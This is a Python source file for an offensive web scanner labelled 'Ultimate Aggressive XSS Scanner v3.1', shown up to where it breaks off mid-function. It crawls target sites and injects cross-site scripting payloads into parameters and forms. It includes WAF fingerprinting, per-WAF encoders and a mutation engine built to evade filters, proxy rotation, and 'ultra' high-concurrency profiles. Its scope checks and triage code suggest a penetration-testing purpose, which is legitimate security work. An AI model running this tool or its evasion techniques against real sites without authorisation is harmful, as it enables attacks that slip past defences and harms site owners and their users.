#!/usr/bin/env python3
# -*- coding: utf-8 -*-

r"""
________________________________________________________________________________
    ___ _   _ _   _ _____   _    ____   ____  
   / _ \ | | | \ | |_   _| / \  / ___| / ___| 
  | | | | | | |  \| | | |  / _ \ \___ \| |     
  | |_| | |_| | |\  | | | / ___ \ ___) | |___ 
   \__\_\\___/|_| \_| |_|/_/   \_\____/ \____|
________________________________________________________________________________
               ULTIMATE AGGRESSIVE XSS SCANNER v3.1
         Advanced WAF evasion · Context‑aware polyglots · ML scoring
                           Proxy rotation · Async forms
________________________________________________________________________________
"""

import argparse
import asyncio
import html
import json
import os
import random
import re
import string
import sys
import time
from collections import deque, defaultdict
from urllib.parse import (
    urljoin,
    urlparse,
    quote,
    unquote,
    parse_qs,
    parse_qsl,
    urlencode,
    urlunparse,
)

import aiohttp
import requests
from bs4 import BeautifulSoup

# Optional: for DOM XSS
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# ----------------------------------------------------------------------
# Configuration defaults
# ----------------------------------------------------------------------
DEFAULT_WORKERS = 20
DEFAULT_DELAY = 0.1
DEFAULT_JITTER = 0.05
DEFAULT_DEPTH = 2
DEFAULT_PAYLOAD_LIMIT = 1000
DEFAULT_DOM_LIMIT = 50
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADERS = {'User-Agent': USER_AGENT}
REQUEST_TIMEOUT = 10

class ProxyRotator:
    """Round-robin/random proxy selector."""
    def __init__(self, proxy_list=None):
        self.proxies = [p for p in (proxy_list or []) if p]
        self.current = 0

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current]
        self.current = (self.current + 1) % len(self.proxies)
        return proxy

    def random_proxy(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)

class ScopeManager:
    """Centralized scope evaluation for URLs."""
    def __init__(self, target_url, include_subdomains=True, in_scope=None, out_scope=None):
        self.target_url = target_url
        parsed = urlparse(target_url)
        self.target_host = (parsed.hostname or "").lower()
        self.target_port = parsed.port
        self.target_scheme = parsed.scheme
        self.include_subdomains = include_subdomains
        self.in_scope_patterns = [re.compile(p, re.I) for p in (in_scope or [])]
        self.out_scope_patterns = [re.compile(p, re.I) for p in (out_scope or [])]

    def _host_in_scope(self, host):
        host = (host or "").lower()
        if host == self.target_host:
            return True
        if self.include_subdomains and host.endswith("." + self.target_host):
            return True
        return False

    def is_in_scope(self, url):
        try:
            parsed = urlparse(url)
            host = (parsed.hostname or "").lower()
            # First: baseline host scope
            if not self._host_in_scope(host):
                return False
            # Then explicit allow patterns (if provided)
            if self.in_scope_patterns and not any(p.search(url) for p in self.in_scope_patterns):
                return False
            # Finally explicit deny patterns
            if any(p.search(url) for p in self.out_scope_patterns):
                return False
            return True
        except Exception:
            return False

def load_scope_file(path):
    """Load allow/deny regex patterns from a scope file.
    Format:
      + regex
      - regex
    """
    in_scope = []
    out_scope = []
    if not path or not os.path.exists(path):
        return in_scope, out_scope
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("+"):
                in_scope.append(line[1:].strip())
            elif line.startswith("-"):
                out_scope.append(line[1:].strip())
    return in_scope, out_scope

# ----------------------------------------------------------------------
# 1. ADVANCED WAF FINGERPRINTING DATABASE
# ----------------------------------------------------------------------
WAF_SIGNATURES = [
    # Cloudflare
    (r'cloudflare', 'Cloudflare', ['CF-Ray', '__cfduid']),
    # ModSecurity
    (r'ModSecurity', 'ModSecurity', ['ModSecurity']),
    # F5 BIG-IP ASM
    (r'BigIP|F5', 'F5 BIG-IP ASM', ['BigIP', 'TS']),
    # Sucuri
    (r'Sucuri', 'Sucuri', ['sucuri']),
    # Incapsula
    (r'Incapsula', 'Incapsula', ['incap_ses', 'visid_incap']),
    # AWS WAF
    (r'AWS', 'AWS WAF', ['x-amz-cf-id']),
    # Akamai
    (r'Akamai', 'Akamai', ['Akamai']),
    # Barracuda
    (r'Barracuda', 'Barracuda', ['barra']),
    # Fortinet
    (r'Fortinet', 'Fortinet', ['Forti']),
    # Imperva
    (r'Imperva', 'Imperva', ['imperva']),
    # Radware
    (r'Radware', 'Radware', ['radware']),
    # Citrix
    (r'Citrix', 'Citrix', ['citrix']),
    # Comodo
    (r'Comodo', 'Comodo', ['comodo']),
]

class WAFDetector:
    """Multi‑probe WAF fingerprinting."""
    def __init__(self, session):
        self.session = session
        self.detected_waf = None

    def probe_headers(self, url):
        """Check response headers for WAF fingerprints."""
        try:
            resp = self.session.get(url, timeout=5)
            headers = resp.headers
            server = headers.get('Server', '')
            cookies = resp.cookies.get_dict()
            for pattern, name, indicators in WAF_SIGNATURES:
                # Check server header
                if re.search(pattern, server, re.I):
                    return name
                # Check indicators in headers
                for ind in indicators:
                    if ind in headers or any(ind in c for c in cookies):
                        return name
        except:
            pass
        return None

    def probe_attack(self, url):
        """Send a malicious payload and analyze the response."""
        payload = "<script>alert(1)</script>"
        parsed = urlparse(url)
        if parsed.query:
            test_url = url + "&xss=" + quote(payload)
        else:
            test_url = url + "?xss=" + quote(payload)
        try:
            resp = self.session.get(test_url, timeout=5)
            text = resp.text
            # Look for WAF block pages
            block_indicators = ['cloudflare', 'incapsula', 'sucuri', 'mod_security', 'waf', 'blocked', 'forbidden']
            for ind in block_indicators:
                if ind in text.lower():
                    return f"Possible {ind.title()} WAF"
        except:
            pass
        return None

    def fingerprint(self, url):
        """Run all probes and return WAF name or None."""
        # Probe 1: headers
        waf = self.probe_headers(url)
        if waf:
            self.detected_waf = waf
            return waf
        # Probe 2: attack response
        waf = self.probe_attack(url)
        if waf:
            self.detected_waf = waf
            return waf
        return None

# ----------------------------------------------------------------------
# 2. CONTEXT-AWARE POLYGLOT GENERATION
# ----------------------------------------------------------------------
def detect_context(response_text, param_value):
    """
    Detect where the parameter value is reflected.
    Returns a list of contexts: 'html', 'attribute', 'script', 'css', 'url'.
    """
    contexts = []
    # Inside HTML tag content
    if re.search(rf'>[^<]*{re.escape(param_value)}[^<]*<', response_text, re.IGNORECASE):
        contexts.append('html')
    # Inside an attribute value
    if re.search(rf'=[\'"][^\'"]*{re.escape(param_value)}[\'"]', response_text, re.IGNORECASE):
        contexts.append('attribute')
    # Inside a <script> block
    if re.search(rf'<script[^>]*>[^<]*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('script')
    # Inside a <style> block or style attribute
    if re.search(rf'style=[\'"][^\'"]*{re.escape(param_value)}', response_text, re.IGNORECASE) or \
       re.search(rf'<style[^>]*>[^<]*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('css')
    # In a URL attribute (href, src)
    if re.search(rf'(href|src)=[\'"]?[^\'"]*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('url')
    return contexts

def _normalize_whitespace(value):
    return re.sub(r'\s+', ' ', value or '').strip()

def extract_reflection_snippets(response_text, param_value, window=120, limit=2):
    snippets = []
    if not response_text or not param_value:
        return snippets
    for match in re.finditer(re.escape(param_value), response_text, re.IGNORECASE):
        start = max(0, match.start() - window)
        end = min(len(response_text), match.end() + window)
        snippet = _normalize_whitespace(response_text[start:end])
        if snippet and snippet not in snippets:
            snippets.append(snippet)
        if len(snippets) >= limit:
            break
    return snippets

def triage_reflection(response_text, reflected_value, contexts):
    normalized_contexts = sorted(set(contexts or []))
    response_lower = response_text.lower()
    reflected_lower = (reflected_value or "").lower()
    snippets = extract_reflection_snippets(response_text, reflected_value)
    occurrence_count = len(re.findall(re.escape(reflected_value), response_text, re.IGNORECASE)) if reflected_value else 0

    escaped_forms = {
        'html_escaped': html.escape(reflected_value or "", quote=True) in response_text if reflected_value else False,
        'url_encoded': quote(reflected_value or "", safe="") in response_text if reflected_value else False,
        'unicode_escaped': reflected_lower.replace("<", "\\u003c").replace(">", "\\u003e") in response_lower if reflected_lower else False,
    }

    sink_patterns = {
        'innerHTML': r'innerhtml\s*=',
        'outerHTML': r'outerhtml\s*=',
        'document.write': r'document\.write(?:ln)?\s*\(',
        'eval': r'(?<![\w.])eval\s*\(',
        'Function': r'new\s+function\s*\(',
        'setTimeout(string)': r'settimeout\s*\(\s*[\'"]',
        'setInterval(string)': r'setinterval\s*\(\s*[\'"]',
        'location': r'(window\.)?location(?:\.href)?\s*=',
        'url_attr': r'(href|src|action)\s*=',
    }
    matched_sinks = [name for name, pattern in sink_patterns.items() if re.search(pattern, response_lower, re.IGNORECASE)]

    script_breakout_chars = any(token in reflected_value for token in ("</script>", "';", '";', "`;")) if reflected_value else False
    attr_breakout_chars = any(token in reflected_value for token in ('"', "'", " on", ">")) if reflected_value else False
    javascript_scheme = reflected_lower.startswith("javascript:")
    encoded_only = any(escaped_forms.values()) and reflected_value not in response_text

    confidence = "low"
    verdict = "reflection_only"
    reasons = []

    if normalized_contexts:
        reasons.append(f"Reflected in context(s): {', '.join(normalized_contexts)}")
    if occurrence_count > 1:
        reasons.append(f"Reflected {occurrence_count} times in the response")
    if matched_sinks:
        reasons.append(f"Page contains risky sink keywords: {', '.join(matched_sinks)}")
    if encoded_only:
        reasons.append("Reflection appears encoded or escaped")
    if javascript_scheme:
        reasons.append("Payload is a javascript: scheme and needs a navigable sink to execute")

    if 'script' in normalized_contexts and script_breakout_chars:
        confidence = "high"
        verdict = "promising"
        reasons.append("Payload contains script-context breakout characters")
    elif 'attribute' in normalized_contexts and attr_breakout_chars:
        confidence = "medium"
        verdict = "needs_manual_verification"
        reasons.append("Payload may be able to break out of an attribute value")
    elif 'url' in normalized_contexts and javascript_scheme:
        confidence = "medium" if matched_sinks else "low"
        verdict = "needs_manual_verification"
        reasons.append("javascript: payload is only useful if the reflected value is later navigated or clicked")
    elif matched_sinks and normalized_contexts:
        confidence = "medium"
        verdict = "needs_manual_verification"
        reasons.append("Reflection and sink indicators coexist in the same response")
    elif encoded_only or (javascript_scheme and set(normalized_contexts).issubset({'html', 'script'})):
        verdict = "likely_false_positive"
        reasons.append("Reflection pattern matches common scanner noise")

    return {
        'verdict': verdict,
        'confidence': confidence,
        'contexts': normalized_contexts,
        'occurrences': occurrence_count,
        'matched_sinks': matched_sinks,
        'escaped_forms': escaped_forms,
        'snippets': snippets,
        'reasons': reasons,
    }

def build_reflected_finding(url, payload, response_text, **extra):
    contexts = detect_context(response_text, payload)
    finding = {
        'url': url,
        'payload': payload,
        'contexts': contexts,
        'triage': triage_reflection(response_text, payload, contexts),
    }
    finding.update(extra)
    return finding

def generate_polyglot_for_context(context):
    """Return a polyglot payload that works in the given context."""
    polyglots = {
        'html': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ],
        'attribute': [
            "\" onmouseover=alert(1) \"",
            "' onfocus=alert(1) autofocus '",
            "javascript:alert(1)",
        ],
        'script': [
            "';alert(1);//",
            "\";alert(1);//",
            "</script><script>alert(1)</script>",
        ],
        'css': [
            "}</style><script>alert(1)</script><style>",
            "background:url('javascript:alert(1)');",
        ],
        'url': [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
    }
    # Return a random polyglot from the list, or a default
    return random.choice(polyglots.get(context, polyglots['html']))

# ----------------------------------------------------------------------
# 3. DYNAMIC ENCODING SELECTION BASED ON WAF
# ----------------------------------------------------------------------
def get_encoder_for_waf(waf_name):
    """Return an encoding function suitable for the given WAF."""
    encoders = {
        'Cloudflare': lambda p: re.sub(r'(<script)', r'<script /*comment*/', p, flags=re.I),  # comment injection
        'ModSecurity': lambda p: p.replace('<', '<\n').replace('>', '\n>'),  # line breaks
        'F5 BIG-IP ASM': lambda p: ''.join(['%' + hex(ord(c))[2:].zfill(2).upper() for c in p]),  # full URL encode
        'Sucuri': lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),  # HTML entities
        'Incapsula': lambda p: ''.join(['\\x' + hex(ord(c))[2:].zfill(2) for c in p]),  # hex escape
        'AWS WAF': lambda p: re.sub(r'(alert)', r'\\u0061lert', p, flags=re.I),  # JS Unicode
        'Akamai': lambda p: p.replace(' ', '/**/'),  # comment insertion
        'Barracuda': lambda p: p.replace('<', '<!-').replace('>', '->'),  # comment obfuscation
    }
    return encoders.get(waf_name, lambda p: p)  # identity if unknown

# ----------------------------------------------------------------------
# 4. TIME‑BASED EVASION
# ----------------------------------------------------------------------
def split_payload(payload, chunk_size=2, delay=0.1):
    """
    Split payload into chunks and return a list of request tuples (url_part, delay_after).
    This is a simplistic simulation; real split requires server‑side support.
    Here we just return the payload unchanged and rely on inter‑request delays.
    """
    # For demonstration, we just add a delay before the request.
    time.sleep(delay)
    return payload

def inter_character_delay(payload, delay=0.05):
    """Simulate sending characters with delays (not easily implemented in HTTP)."""
    # Not implemented – we'll just sleep before the request.
    return payload

# ----------------------------------------------------------------------
# 5. MUTATION ENGINE
# ----------------------------------------------------------------------
class MutationEngine:
    """Generate thousands of variants of a base payload."""
    @staticmethod
    def mutate(payload, intensity=10):
        """Apply a series of mutations to create many variants."""
        variants = []
        base = payload
        for _ in range(intensity):
            # Random case
            v = ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in base)
            variants.append(v)
            # Insert comments
            v = base.replace('<', '<!-', 1) if '<' in base else base
            variants.append(v)
            # URL encode some characters
            v = ''.join('%' + hex(ord(c))[2:].zfill(2).upper() if c in '<>"\'&;=' else c for c in base)
            variants.append(v)
            # Full URL encode
            v = ''.join('%' + hex(ord(c))[2:].zfill(2).upper() for c in base)
            variants.append(v)
            # HTML entities
            v = ''.join('&' + {'<':'lt', '>':'gt', '"':'quot', "'":'#39', '&':'amp'}.get(c, c) + ';' if c in '<>"\'&' else c for c in base)
            variants.append(v)
            # JS Unicode escapes
            v = ''.join('\\u' + hex(ord(c))[2:].zfill(4) if c.isalpha() else c for c in base)
            variants.append(v)
            # Add whitespace
            v = base.replace(' ', random.choice(['\n', '\t', ' ']), random.randint(1, 3))
            variants.append(v)
        # Remove duplicates and return
        return list(set(variants))[:100]  # limit to 100 per base

# ----------------------------------------------------------------------
# 6. INTEGRATION WITH PUBLIC WAF BYPASS REPOSITORIES
# ----------------------------------------------------------------------
def load_external_payloads(file_paths):
    """Load payloads from multiple external files."""
    payloads = []
    for fpath in file_paths:
        if os.path.exists(fpath):
            with open(fpath, 'r') as f:
                payloads.extend([line.strip() for line in f if line.strip()])
    return list(set(payloads))

# ----------------------------------------------------------------------
# 7. MACHINE LEARNING FOR PAYLOAD SELECTION (SIMPLIFIED)
# ----------------------------------------------------------------------
class PayloadScorer:
    """Simple learning mechanism: track success counts per payload type."""
    def __init__(self):
        self.scores = defaultdict(int)  # payload hash -> score
        self.total_tries = 0
        self.successes = 0

    def record_success(self, payload):
        """Increase score for a successful payload."""
        self.scores[hash(payload)] += 1
        self.successes += 1

    def record_failure(self, payload):
        """Optionally decrease score."""
        self.scores[hash(payload)] -= 0.1

    def get_weighted_payloads(self, payloads, top_k=100):
        """Return top_k payloads based on current scores (if any)."""
        if not self.scores:
            return random.sample(payloads, min(top_k, len(payloads)))
        # Sort by score descending
        scored = [(self.scores.get(hash(p), 0), p) for p in payloads]
        scored.sort(reverse=True)
        return [p for _, p in scored[:top_k]]

    def get_efficiency_boost(self):
        """Return a rough estimate of improvement (for display)."""
        if self.total_tries == 0:
            return 0
        return (self.successes / self.total_tries) * 100  # not accurate, just cosmetic

# ----------------------------------------------------------------------
# 8. CRAWLER (SYNC/ASYNC)
# ----------------------------------------------------------------------
class Crawler:
    def __init__(self, start_url, max_depth, cookies=None, path_filter=None, delay=0, jitter=0, proxy=None, scope_checker=None, proxy_rotator=None):
        self.start_url = start_url
        self.base_domain = urlparse(start_url).netloc
        self.max_depth = max_depth
        self.cookies = cookies or {}
        self.path_filter = path_filter
        self.scope_checker = scope_checker
        self.delay = delay
        self.jitter = jitter
        self.proxy = proxy
        self.proxy_rotator = proxy_rotator
        self.visited = set()
        self.urls_to_visit = deque()
        self.urls_to_visit.append((start_url, 0))

    async def fetch_async(self, session, url):
        req_proxy = self.proxy_rotator.random_proxy() if self.proxy_rotator else self.proxy
        try:
            async with session.get(url, timeout=REQUEST_TIMEOUT, proxy=req_proxy) as resp:
                if resp.status == 200:
                    return await resp.text()
        except:
            return None
        return None

    def fetch_sync(self, session, url):
        try:
            kwargs = {'timeout': REQUEST_TIMEOUT}
            req_proxy = self.proxy_rotator.random_proxy() if self.proxy_rotator else self.proxy
            if req_proxy:
                kwargs['proxies'] = {'http': req_proxy, 'https': req_proxy}
            resp = session.get(url, **kwargs)
            if resp.status_code == 200:
                return resp.text
        except:
            return None
        return None

    async def crawl_async(self, session):
        all_urls = set()
        all_forms = []
        while self.urls_to_visit:
            url, depth = self.urls_to_visit.popleft()
            if url in self.visited or depth > self.max_depth:
                continue
            if self.path_filter and not self.path_filter(url):
                continue
            if self.scope_checker and not self.scope_checker(url):
                continue
            self.visited.add(url)
            print(f"[Crawl] Depth {depth}: {url}")

            html = await self.fetch_async(session, url)
            if html:
                all_urls.add(url)
                forms = extract_forms(url, html)
                all_forms.extend(forms)
                links = get_links(url, html, self.base_domain, scope_checker=self.scope_checker)
                for link in links:
                    if link not in self.visited:
                        self.urls_to_visit.append((link, depth+1))

            if self.delay > 0:
                await asyncio.sleep(self.delay + random.uniform(0, self.jitter))
        return all_urls, all_forms

    def crawl_sync(self, session):
        all_urls = set()
        all_forms = []
        while self.urls_to_visit:
            url, depth = self.urls_to_visit.popleft()
            if url in self.visited or depth > self.max_depth:
                continue
            if self.path_filter and not self.path_filter(url):
                continue
            if self.scope_checker and not self.scope_checker(url):
                continue
            self.visited.add(url)
            print(f"[Crawl] Depth {depth}: {url}")

            html = self.fetch_sync(session, url)
            if html:
                all_urls.add(url)
                forms = extract_forms(url, html)
                all_forms.extend(forms)
                links = get_links(url, html, self.base_domain, scope_checker=self.scope_checker)
                for link in links:
                    if link not in self.visited:
                        self.urls_to_visit.append((link, depth+1))

            if self.delay > 0:
                time.sleep(self.delay + random.uniform(0, self.jitter))
        return all_urls, all_forms

# ----------------------------------------------------------------------
# 9. HELPER FUNCTIONS
# ----------------------------------------------------------------------
def extract_forms(url, html):
    soup = BeautifulSoup(html, 'html.parser')
    forms = []
    for form in soup.find_all('form'):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = []
        for inp in form.find_all(['input','textarea','select']):
            name = inp.get('name')
            if name:
                inp_type = inp.get('type','text')
                value = inp.get('value','')
                inputs.append({'name': name, 'type': inp_type, 'value': value})
        forms.append({'action':action, 'method':method, 'inputs':inputs, 'original_url':url})
    return forms

def get_links(url, html, base_domain, scope_checker=None):
    soup = BeautifulSoup(html, 'html.parser')
    links = set()
    for a in soup.find_all('a', href=True):
        href = a['href']
        full = urljoin(url, href)
        if scope_checker:
            if scope_checker(full):
                links.add(full)
        elif urlparse(full).netloc == base_domain:
            links.add(full)
    return links

def extract_url_params(url):
    parsed = urlparse(url)
    if parsed.query:
        return list(parse_qs(parsed.query).keys())
    return []

def is_storage_candidate(form):
    """Heuristic: POST forms with at least one text-like field are storage candidates."""
    if form.get('method') != 'post':
        return False
    injectable_types = {'text', 'search', 'email', 'url', 'tel', 'textarea', 'password'}
    for inp in form.get('inputs', []):
        t = (inp.get('type') or 'text').lower()
        if t in injectable_types:
            return True
    return False

def dedupe_finding_list(items):
    """Remove duplicate dict/list findings while preserving order."""
    seen = set()
    out = []
    for item in items:
        try:
            key = json.dumps(item, sort_keys=True, default=str)
        except Exception:
            key = str(item)
        if key in seen:
            continue
        seen.add(key)
        out.append(item)
    return out

def dedupe_findings(findings):
    for k, v in findings.items():
        if isinstance(v, list):
            findings[k] = dedupe_finding_list(v)
    return findings

def summarize_reflected_triage(reflected_findings):
    summary = {
        'total': len(reflected_findings),
        'by_verdict': {},
        'by_confidence': {},
    }
    for finding in reflected_findings:
        triage = finding.get('triage', {})
        verdict = triage.get('verdict', 'unclassified')
        confidence = triage.get('confidence', 'unknown')
        summary['by_verdict'][verdict] = summary['by_verdict'].get(verdict, 0) + 1
        summary['by_confidence'][confidence] = summary['by_confidence'].get(confidence, 0) + 1
    return summary

def ask_yes_no(prompt, default=True):
    suffix = " [Y/n]: " if default else " [y/N]: "
    while True:
        ans = input(prompt + suffix).strip().lower()
        if not ans:
            return default
        if ans in ("y", "yes"):
            return True
        if ans in ("n", "no"):
            return False
        print("Please answer yes or no.")

def apply_scan_profile(args, profile):
    p = (profile or "balanced").lower()
    if p == "balanced":
        return
    if p == "aggressive":
        args.async_mode = True
        args.workers = max(args.workers, 60)
        args.delay = min(args.delay, 0.02)
        args.jitter = min(args.jitter, 0.01)
        args.payload_limit = max(args.payload_limit, 2000)
        args.dom_limit = max(args.dom_limit, 200)
        return
    if p == "ultra":
        args.async_mode = True
        args.workers = max(args.workers, 120)
        args.delay = 0.0
        args.jitter = 0.0
        args.payload_limit = max(args.payload_limit, 4000)
        args.dom_limit = max(args.dom_limit, 1000)
        return

def interactive_v2_confirm(args):
    """V2-style confirmation: confirm modules + aggressiveness before scan."""
    if args.non_interactive or not sys.stdin.isatty():
        return

    print("\n=== V2 Scan Confirmation ===")
    use_all = ask_yes_no("Run all major modules (waf, reflected, forms, stored, blind, dom, wp)?", default=True)
    if use_all:
        args.no_waf = False
        args.no_reflected = False
        args.no_forms = False
        args.no_stored = False
        args.no_blind = False
        args.no_dom = False
        args.no_wp = False
    else:
        args.no_waf = not ask_yes_no("Run WAF fingerprint check?", default=True)
        args.no_reflected = not ask_yes_no("Run reflected URL/param scan?", default=True)
        args.no_forms = not ask_yes_no("Run reflected form scan?", default=True)
        args.no_stored = not ask_yes_no("Run stored XSS scan?", default=True)
        args.no_blind = not ask_yes_no("Run blind XSS injection?", default=bool(args.collaborator))
        args.no_dom = not ask_yes_no("Run DOM XSS scan?", default=args.headless)
        args.no_wp = not ask_yes_no("Run WordPress admin notice scan?", default=True)

    print("\nAggressiveness profile:")
    print("  1) balanced")
    print("  2) aggressive")
    print("  3) ultra")
    print("  4) custom (keep current CLI values)")
    choice = input("Select profile [1-4] (default 1): ").strip()
    profile_map = {"1": "balanced", "2": "aggressive", "3": "ultra", "4": "custom"}
    profile = profile_map.get(choice, "balanced")
    if profile != "custom":
        apply_scan_profile(args, profile)

    print("\nSelected config:")
    print(f"  waf={not args.no_waf}, reflected={not args.no_reflected}, forms={not args.no_forms}, stored={not args.no_stored}, blind={not args.no_blind}, dom={not args.no_dom}, wp={not args.no_wp}")
    print(f"  profile={profile}, workers={args.workers}, delay={args.delay}, jitter={args.jitter}, payload_limit={args.payload_limit}, dom_limit={args.dom_limit}, async={args.async_mode}")
    if not ask_yes_no("Proceed with scan?", default=True):
        print("Scan cancelled by user.")
        sys.exit(0)

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def is_wordpress(base_url, session):
    checks = ['/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php']
    for path in checks:
        try:
            r = session.get(urljoin(base_url, path), timeout=5)
            if r.status_code == 200:
                return True
        except:
            pass
    return False

# ----------------------------------------------------------------------
# 10. XSS TESTER (FULLY ENHANCED)
# ----------------------------------------------------------------------
class XSSTester:
    def __init__(self, cookies=None, use_headless=False, collaborator=None,
                 delay=0, jitter=0, max_workers=20, proxy=None, waf_name=None,
                 external_payloads=None, ml_enabled=False):
        self.cookies = cookies or {}
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.cookies.update(self.cookies)
        if proxy:
            self.session.proxies.update({'http': proxy, 'https': proxy})
        self.use_headless = use_headless
        self.collaborator = collaborator
        self.delay = delay
        self.jitter = jitter
        self.max_workers = max_workers
        self.proxy = proxy
        self.proxy_rotator = None
        self.waf_name = waf_name
        self.encoder = get_encoder_for_waf(waf_name) if waf_name else (lambda p: p)
        self.mutation_engine = MutationEngine()
        self.external_payloads = external_payloads or []
        self.ml_enabled = ml_enabled
        self.scorer = PayloadScorer() if ml_enabled else None
        self.driver = None
        if use_headless and SELENIUM_AVAILABLE:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            if proxy:
                chrome_options.add_argument(f'--proxy-server={proxy}')
            self.driver = webdriver.Chrome(options=chrome_options)
        elif use_headless and not SELENIUM_AVAILABLE:
            print("[!] Selenium not installed; DOM testing disabled.")
            self.use_headless = False

    def set_proxy_rotator(self, proxy_rotator):
        self.proxy_rotator = proxy_rotator

    def _pick_proxy(self):
        if self.proxy_rotator:
            return self.proxy_rotator.random_proxy()
        return self.proxy

    def _sync_request(self, method, url, **kwargs):
        req_proxy = self._pick_proxy()
        if req_proxy:
            kwargs['proxies'] = {'http': req_proxy, 'https': req_proxy}
        return self.session.request(method, url, **kwargs)

    def _apply_time_evasion(self, payload):
        """
        Apply time-based evasion hooks before sending payload.
        Kept lightweight so scans remain practical.
        """
        evasive = payload
        if self.delay > 0:
            # Simulate chunked/throttled preparation path.
            evasive = split_payload(evasive, chunk_size=2, delay=min(self.delay, 0.25))
            evasive = inter_character_delay(evasive, delay=min(self.delay / 10.0, 0.05))
        return evasive

    def _prepare_payload(self, payload):
        """Prepare payload with WAF-aware encoding and time-based evasion."""
        encoded_payload = self.encoder(payload)
        return self._apply_time_evasion(encoded_payload)

    def close(self):
        if self.driver:
            self.driver.quit()

    # --- Core test methods (sync versions) ---
    def test_reflected_param_sync(self, url, param, base_payloads):
        parsed = urlparse(url)
        qs = dict(parse_qsl(parsed.query))
        findings = []
        # Use ML to select top payloads if enabled
        if self.ml_enabled and self.scorer:
            payloads = self.scorer.get_weighted_payloads(base_payloads, top_k=50)
        else:
            payloads = base_payloads

        for payload in payloads:
            encoded_payload = self._prepare_payload(payload)
            qs[param] = encoded_payload
            new_qs = urlencode(qs)
            test_url = urlunparse(parsed._replace(query=new_qs))
            try:
                resp = self._sync_request('GET', test_url, timeout=REQUEST_TIMEOUT)
                # Check reflection
                if encoded_payload in resp.text:
                    finding = build_reflected_finding(
                        test_url,
                        encoded_payload,
                        resp.text,
                        param=param,
                    )
                    contexts = finding['contexts']
                    findings.append(finding)
                    # Context-aware polyglot probing (active runtime use)
                    for ctx in contexts:
                        polyglot = self._prepare_payload(generate_polyglot_for_context(ctx))
                        if polyglot == encoded_payload:
                            continue
                        qs[param] = polyglot
                        poly_qs = urlencode(qs)
                        poly_url = urlunparse(parsed._replace(query=poly_qs))
                        try:
                            poly_resp = self._sync_request('GET', poly_url, timeout=REQUEST_TIMEOUT)
                            if polyglot in poly_resp.text:
                                findings.append(build_reflected_finding(
                                    poly_url,
                                    polyglot,
                                    poly_resp.text,
                                    param=param,
                                    strategy='context_polyglot',
                                ))
                        except Exception:
                            pass
                    if self.ml_enabled and self.scorer:
                        self.scorer.record_success(payload)
                else:
                    if self.ml_enabled and self.scorer:
                        self.scorer.record_failure(payload)
            except Exception:
                pass
            # Time‑based evasion: add delay between requests
            if self.delay > 0:
                time.sleep(self.delay + random.uniform(0, self.jitter))
        return findings

    async def test_reflected_param_async(self, aio_session, url, param, base_payloads, semaphore):
        """
        Async parity version of reflected URL/param testing.
        Mirrors sync behavior including context-aware polyglot probing.
        """
        parsed = urlparse(url)
        qs = dict(parse_qsl(parsed.query))
        findings = []
        if self.ml_enabled and self.scorer:
            payloads = self.scorer.get_weighted_payloads(base_payloads, top_k=50)
        else:
            payloads = base_payloads

        async with semaphore:
            for payload in payloads:
                encoded_payload = self._prepare_payload(payload)
                qs[param] = encoded_payload
                new_qs = urlencode(qs)
                test_url = urlunparse(parsed._replace(query=new_qs))
                try:
                    async with aio_session.get(test_url, timeout=REQUEST_TIMEOUT, proxy=self._pick_proxy()) as resp:
                        body = await resp.text()
                    if encoded_payload in body:
                        finding = build_reflected_finding(
                            test_url,
                            encoded_payload,
                            body,
                            param=param,
                        )
                        contexts = finding['contexts']
                        findings.append(finding)
                        for ctx in contexts:
                            polyglot = self._prepare_payload(generate_polyglot_for_context(ctx))
                            if polyglot == encoded_payload:
                                continue
                            qs[param] = polyglot
                            poly_qs = urlencode(qs)
                            poly_url = urlunparse(parsed._replace(query=poly_qs))
                            try:
                                async with aio_session.get(poly_url, timeout=REQUEST_TIMEOUT, proxy=self._pick_proxy()) as poly_resp:
                                    poly_body = await poly_resp.text()
                                if polyglot in poly_body:
                                    findings.append(build_reflected_finding(
                                        poly_url,
                                        polyglot,
                                        poly_body,
                                        param=param,
                                        strategy='context_polyglot',
                                    ))
                            except Exception:
                                pass
                        if self.ml_enabled and self.scorer:
                            self.scorer.record_success(payload)
                    else:
                        if self.ml_enabled and self.scorer:
                            self.scorer.record_failure(payload)
                except Exception:
                    pass
                if self.delay > 0:
                    await asyncio.sleep(self.delay + random.uniform(0, self.jitter))
        return findings

    async def test_reflected_form_async(self, aio_session, form, base_payloads, semaphore):
        """Async parity version of reflected form testing."""
        action = urljoin(form['original_url'], form['action'])
        method = form['method']
        findings = []
        if self.ml_enabled and self.scorer:
            payloads = self.scorer.get_weighted_payloads(base_payloads, top_k=50)
        else:
            payloads = base_payloads
        async with semaphore:
            for payload in payloads:
                encoded_payload = self._prepare_payload(payload)
                data = {}
                for inp in form['inputs']:
                    if inp['type'] not in ['submit', 'button', 'image']:
                        data[inp['name']] = encoded_payload if inp['type'] == 'text' else inp.get('value', '')
                try:
                    if method == 'post':
                        async with aio_session.post(action, data=data, timeout=REQUEST_TIMEOUT, proxy=self._pick_proxy()) as resp:
                            body = await resp.text()
                    else:
